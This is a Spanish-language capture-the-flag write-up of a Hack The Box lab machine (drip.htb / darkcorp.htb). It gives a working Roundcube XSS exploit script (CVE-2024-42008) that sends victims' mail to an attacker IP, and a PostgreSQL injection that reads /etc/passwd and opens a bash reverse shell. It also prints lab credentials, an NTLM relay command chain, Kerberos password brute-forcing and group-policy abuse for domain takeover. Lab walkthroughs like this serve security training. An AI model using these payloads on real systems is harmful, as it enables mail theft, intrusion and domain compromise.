
---

![[Pasted image 20250213050534.png]]


Una máquina Windows, donde primero leemos correos vía XSS en Roundcube, realizamos SQL Injection en el portal interno y encontramos las credenciales del sistema Linux. 
Para capturar el dominio, se utilizó una ruta que considero no intencionada mediante fuerza bruta de una cuenta capaz de modificar la política de grupo.

---

## Enumeración

```nmap
nmap -p- --open -sSCV -Pn --min-rate 4500 -oN nmap_scan.txt 10.10.11.54
Nmap scan report for 10.10.11.54
Host is up (0.043s latency).
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 33:41:ed:0a:a5:1a:86:d0:cc:2a:a6:2b:8d:8d:b2:ad (ECDSA)
|_  256 04:ad:7e:ba:11:0e:e0:fb:d0:80:d3:24:c2:3e:2c:c5 (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.22.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Feb  8 22:02:40 2025 -- 1 IP address (1 host up) scanned in 41.18 seconds
```


Añadimos al /etc/hosts:

```bash
echo "10.10.11.54 drip.htb" | sudo tee -a /etc/hosts
```

Veamos el servicio de correo Roundcube en la captura de pantalla:

![[Pasted image 20250212193615.png]]

Podemos registrar una cuenta y también enviarnos una carta desde el sitio:

![[Pasted image 20250212194111.png]]

Hacemos clic en "Sign In" y vemos el dominio mail.drip.htb , lo añadimos a /etc/hosts 

![[Pasted image 20250212194132.png]]


Intentamos registrar una cuenta e intentamos iniciar sesión.

![[Pasted image 20250212194407.png]]

![[Pasted image 20250212194533.png]]

Mirando las cabeceras del email que tenemos, podemos observar el dominio `drip.darkcorp.htb`.

![[Pasted image 20250212194710.png]]

Intentamos enviarnos una carta desde un formulario del sitio e interceptar la solicitud a través de Burp Suite:

![[Pasted image 20250212195719.png]]

Cambiamos por nuestra dirección fr34ker@drip.htb y obtendremos una carta en la que veremos la dirección de otro usuario bcase@drip.htb :

![[Pasted image 20250212195906.png]]


Esta versión de Roundcube permite hacer XSS con 0-click. Por lo tanto, utilizamos el [CVE-2024-42008](https://www.cve.org/CVERecord?id=CVE-2024-42008) entendiendo las descripciones de este [artículo](https://www.sonarsource.com/blog/government-emails-at-risk-critical-cross-site-scripting-vulnerability-in-roundcube-webmail/).

El codigo base tiene este aspecto:

```js
<body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes
onanimationstart=alert(origin) foo=bar">
Foo
-/body>
```

Nuestro trabajo es leer las cartas de otros usuarios, las cuales pueden ser leidas en `http:-/mail.drip.htb/?_task=mail&_mbox=INBOX&_uid=1&_action=show` donde `_uid` es responsable del identificador del correo.

Asique tomamos un script de un chico de un conocido foro y lo modificamos un poco:

```python
import requests
from http.server import BaseHTTPRequestHandler, HTTPServer
import base64
import threading
from lxml import html
import sys

# Configuration
TARGET_URL = 'http://drip.htb/contact'
LISTEN_PORT = 8000
LISTEN_IP = '0.0.0.0'

start_mesg = "<body title=\"bgcolor=foo\" name=\"bar style=animation-name:progress-bar-stripes onanimationstart=fetch(\'/?_task=mail&_action=show&_uid="
message = sys.argv[1]
end_mesg = "'&_mbox=INBOX&_extwin=1\').then(r=>r.text()).then(t=>fetch(`http://10.10.16.97:8000/c=${btoa(t)}`)) foo=bar\">Foo</body>"


post_data = {
    'name': 'asdf',
    'email': 'bcase',
    'message': f"{start_mesg}{message}{end_mesg}",
    'content': 'html',
    'recipient': 'bcase@drip.htb'
}
print(f"{start_mesg}{message}{end_mesg}")

# Headers for the POST request
headers = {
    'Host': 'drip.htb',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'Origin': 'http://drip.htb',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Referer': 'http://drip.htb/index',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cookie': 'session=eyJfZnJlc2giOmZhbHNlfQ.Z6fOBw.u9iWIiki2cUK55mmcizrzU5EJzE',
    'Connection': 'close'
}

# Function to send the POST request
def send_post():
    response = requests.post(TARGET_URL, data=post_data, headers=headers)
    print(f"[+] POST Request Sent! Status Code: {response.status_code}")

# Custom HTTP request handler to capture and decode the incoming data
class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if '/c=' in self.path:
            encoded_data = self.path.split('/c=')[1]
            decoded_data = base64.b64decode(encoded_data).decode('latin-1')
            print(f"[+] Received data {decoded_data}")
            tree = html.fromstring(decoded_data)

            # XPath query to find the div with id 'messagebody'
            message_body = tree.xpath('//div[@id="messagebody"]')

            # Check if the div exists and extract the content
            if message_body:
                # Extract inner text, preserving line breaks
                message_text = message_body[0].text_content().strip()
                print("[+] Extracted Message Body Content:\n")
                print(message_text)
            else:
                print("[!] No div with id 'messagebody' found.")

        else:
            print("[!] Received request but no data found.")

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')

    def log_message(self, format, *args):
        return  # Suppress default logging

# Function to start the HTTP server
def start_server():
    server_address = (LISTEN_IP, LISTEN_PORT)
    httpd = HTTPServer(server_address, RequestHandler)
    print(f"[+] Listening on port {LISTEN_PORT} for exfiltrated data...")
    httpd.serve_forever()

# Run the HTTP server in a separate thread
server_thread = threading.Thread(target=start_server)
server_thread.daemon = True
server_thread.start()

# Send the POST request
send_post()

# Keep the main thread alive to continue listening
try:
    while True:
        pass
except KeyboardInterrupt:
    print("\n[+] Stopping server.")
```

El script envía un correo XSS al usuario bcase@drip.htb en nombre de root y nos permite leer el correo con el identificador requerido.

`python3 exploit.py 1`

- correo 1

![[Pasted image 20250212201244.png]]

- correo 2

![[Pasted image 20250212213216.png]]

- correo 3


![[Pasted image 20250212213439.png]]

Añadimos el dominio dev-a3f1-01.drip.htb al /etc/hosts.

- correo 4

![[Pasted image 20250212213808.png]]

Ahora que no hay correos, enviamos el email de reuperación desde el dominio anteriormente añadido `dev-a3f1-01.drip.htb`, al usuario bcase@drip.htb y ejecutamos de nuevo con el mismo id.

![[Pasted image 20250212214144.png]]

![[Pasted image 20250212214745.png]]

Accedemos a la URL y ponemos una passwd.

![[Pasted image 20250212214856.png]]

Accedemos:

![[Pasted image 20250212214928.png]]

en `analitics` podemos ver un imput:

![[Pasted image 20250212215024.png]]

donde añadiendo una query de postgress conseguimos realizar un SQLi. Lo cual sabemos por el dominio descubierto anteriormente y en el cual enontramos un .`venv` en:

`http://drip.darkcorp.htb/dashboard/.env`
```.env
# True for development, False for production
DEBUG=False

# Flask ENV
FLASK_APP=run.py
FLASK_ENV=development

# If not provided, a random one is generated 
# SECRET_KEY=<YOUR_SUPER_KEY_HERE>

# Used for CDN (in production)
# No Slash at the end
ASSETS_ROOT=/static/assets

# If DB credentials (if NOT provided, or wrong values SQLite is used) 
DB_ENGINE=postgresql
DB_HOST=localhost
DB_NAME=dripmail
DB_USERNAME=dripmail_dba
DB_PASS=2Qa2SsBkQvsc
DB_PORT=5432

SQLALCHEMY_DATABASE_URI = 'postgresql://dripmail_dba:2Qa2SsBkQvsc@localhost/dripmail'
SQLALCHEMY_TRACK_MODIFICATIONS = True
SECRET_KEY = 'GCqtvsJtexx5B7xHNVxVj0y2X0m10jq'
MAIL_SERVER = 'drip.htb'
MAIL_PORT = 25
MAIL_USE_TLS = False
MAIL_USE_SSL = False
MAIL_USERNAME = None
MAIL_PASSWORD = None
MAIL_DEFAULT_SENDER = 'support@drip.htb'
```

Sabiendo esto, probamos primero si es vulnerable:

`''; SELECT pg_read_file('/etc/passwd', 0, 2000);`

![[Pasted image 20250212215604.png]]

viendo que lo es, inyectamos la siguiente query para traernos una revshell, escuchando con nc:

```postgress
DO $$
DECLARE

    c text;

BEGIN

    c := CHR(67) || CHR(79) || CHR(80) || CHR(89) ||

        ' (SELECT '''') to program ''bash -c "bash -i >& /dev/tcp/10.10.XX.XX/PORT 0>&1"''';

    EXECUTE c;

END $$;
```

![[Pasted image 20250330001941.png]]


![[Pasted image 20250212215859.png]]

Es muy importante en este punto, encontrar un archivo `dev-dripmail.old.sql.pgp` con contraseñas para poder avanzar mas adelante. Dado que volver hacia atras como hice yo no es muy comodo...

En `/var/backups/postgres/dev-dripmail.old.sql.gpg`. Y para poder leerlo realizamos:

`gpg --use-agent --decrypt /var/backups/postgres/dev-dripmail.old.sql.gpg > dev-dripmail.old.sql  --passphrase 2Qa2SsBkQvsc`

y mirando dentro, podemos ver tres hashes:

![[Pasted image 20250212220923.png]]

y en `/var/log/postgresql/postgresql-15-main.log.1` podremos encontrar tambien el hash de `ebelford`.

![[Pasted image 20250212221359.png]]

Una vez adquiridos las passwd de dos usuarios, nos conectamos por ssh a ebelford haciendo port forwarding al rango `172.16.20.0/24`, dado que sabemos la ip interna de la máquina y las IP de las máquinas a las que llegamos:

![[Pasted image 20250212221712.png]]


![[Pasted image 20250212221829.png]]

Añadimos los dominios al /etc/hosts de forma que queden:

```hosts
10.10.11.54 172.16.20.3  drip.htb mail.drip.htb dev-a3f1-01.drip.htb drip.darkcorp.htb
172.16.20.1     darkcorp.htb dc-01.darkcorp.htb
172.16.20.2     WEB-01 web-01.darkcorp.htb
```


E iniciamos la enumeración interna:

## Enumeración Interna


- DC-01

```nmap
PORT STATE SERVICE  
22/tcp open ssh  
53/tcp open domain  
80/tcp open http  
88/tcp open kerberos  
135/tcp open epmap  
139/tcp open netbios-ssn  
389/tcp open ldap  
443/tcp open https  
445/tcp open microsoft-ds  
464/tcp open kpasswd  
593/tcp open unknown  
636/tcp open ldaps
```

- WEB-01

```nmap
PORT STATE SERVICE VERSION  
80/tcp open http Microsoft IIS httpd 10.0   
135/tcp open msrpc Microsoft Windows RPC  
139/tcp open netbios-ssn Microsoft Windows netbios-ssn  
445/tcp open microsoft-ds?  
5000/tcp open http Microsoft IIS httpd 10.0   
49664/tcp open msrpc Microsoft Windows RPC  
49665/tcp open msrpc Microsoft Windows RPC  
49666/tcp open msrpc Microsoft Windows RPC  
49667/tcp open msrpc Microsoft Windows RPC  
49668/tcp open msrpc Microsoft Windows RPC  
49669/tcp open msrpc Microsoft Windows RPC  
49670/tcp open msrpc Microsoft Windows RPC  
49671/tcp open msrpc Microsoft Windows RPC  
```

Vemos las web de web-01:

- puerto 80:
![[Pasted image 20250213022622.png]]

- puerto 5000:

Autenticación básica con las credenciales de Victor:

![[Pasted image 20250213022731.png]]

Enumeramos usuarios:

![[Pasted image 20250213054153.png]]

Dado que no vemos nada pero tenemos credenciales validas, configuramos proxychains para poder usar bloodhound y dumpearnos los datos: `sudo nano /etc/proxychains4.conf`

```conf
dnat 10.10.11.54 172.16.20.1 
#Arreglamos la resolución de direccionamiento ediante DNAT para que sea pribada.


[ProxyList]
socks5          127.0.0.1 1080
```

Nos conectamos haciendo port forwarding al puerto de proxichains:

![[Pasted image 20250213023358.png]]

Ejecutamos `bloodhound-python`:

![[Pasted image 20250213023519.png]]


En `bloodhound` podemos ver que `taylor.b.adm` es miembro del grupo `gpo_manager` , que puede modificar la directiva SecurityUpdates :

![[Pasted image 20250213024239.png]]
![[Pasted image 20250213053023.png]]

Hay un camino que parece el correcto mediante la explotación del servicio web en el puerto 5000.
Que lleva a la obtención de una consola `ldap` con el usuario `svc_acc`, pero lo mejor que he conseguido es elevarla a `ldaps` y enumerar alguna cosa.

pasos a seguir para ir por el puerto 5000 y conseguir la consola LDAP:

```
# primero ejecutar ntlmrelayx
impacket-ntlmrelayx -t ldaps://172.16.20.1 -debug -i -smb2support -domain darkcorp.htb

# segundo, realizar una solicitud de verificación.
curl --ntlm -u 'victor.r:victor1gustavo@#' -X POST http://172.16.20.2:5000/status" -H "Content-Type: application/json" -d "{\"protocol\":\"http\",\"host\":\"web-01.darkcorp.htb\",\"port\":\"@10.10.x.x:80\"}"

# tercero, después de que el shell ldap se ha generado, conectarse a él.
rlwrap nc 127.0.0.1 11000
```

Seguiré intentando esa via dado que la que sigue parace demasiado sencilla como para ser la oficial...

Este camino parece el menos obvio,  hacer fuerza bruta al usuario `taylor.b.adm`

Por política de contraseñas hacen falta 7 caracteres o mas:

![[Pasted image 20250213054051.png]]

Asique primero eliminaremos del rockyou las contraseñas de menos carácteres:

```python
#/bin/python3

def process_line(line):
    line = line.strip()
    if len(line) < 7:
        return None
    return line
file_path = '/usr/share/wordlists/rockyou.txt'
try:
# Open the file in read mode ('r')
    with open(file_path, 'r', errors='ignore') as file:
        with open("rockyou.txt", 'w', errors='ignore') as outfile:
# Iterate over each line in the file
            for line in file:
# Process each line (call your custom processing function)
                line = process_line(line)
                if not line:
                    continue
                outfile.write(line + "\n")
except FileNotFoundError:
    print(f"Error: The file '{file_path}' was not found.")
except Exception as e:
    print(f"An error occurred: {e}")
```

![[Pasted image 20250213034640.png]]

Ejecutamos kerbrute y obtenemos la contraseña! Este usuario puede iniciar sesión en la máquina DC-01 .

```
┌──(patxasec㉿kali)-[~/htb/darkcorp]
└─$ ~/scripts/Tools/kerbrute_linux_amd64 bruteuser -d darkcorp.htb --dc 172.16.20.1 darkcorp_passwds.txt taylor.b.adm 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 02/13/25 - Ronnie Flathers @ropnop

2025/02/13 04:13:19 >  Using KDC(s):
2025/02/13 04:13:19 >   172.16.20.1:88

2025/02/13 04:14:19 >[+] VALID LOGIN:
2025/02/13 04:14:19 >Done! Tested 55463 logins (1 successes) in 717.731 seconds
real      11m57.743s
user      7m29.288s
taylor.b.adm@darkcorp.htb:!QAZzaq1
sys 1m4.109s
```


Ahora podemos añadir este usuario al admin mediante el abuso de políticas de grupo, solo necesitamos saltarnos el antivirus.

Descargar [PowerGPOAbuse.ps1](https://raw.githubusercontent.com/rootSySdk/PowerGPOAbuse/refs/heads/master/PowerGPOAbuse.ps1)

```
wget
https://raw.githubusercontent.com/rootSySdk/PowerGPOAbuse/refs/heads/master/PowerG
POAbuse.ps1
```

En la máquina, descargamos y añadimos la política, e inmediatamente la aplicamos:

![[Pasted image 20250213042641.png]]

![[Pasted image 20250213042905.png]]

![[Pasted image 20250213043152.png]]

Con los permisos suficientes, dumpeamos los hashes:

![[Pasted image 20250213043300.png]]


## root.txt

![[Pasted image 20250213044604.png]]


## USER.txt

Para adquirir la user necesitamos primero dumpearnos los secrets de web-01 mediante un PtH usando el hash de Administrador.

![[Pasted image 20250213044626.png]]


![[Pasted image 20250213044729.png]]

HAPPY HACKING!!!

---




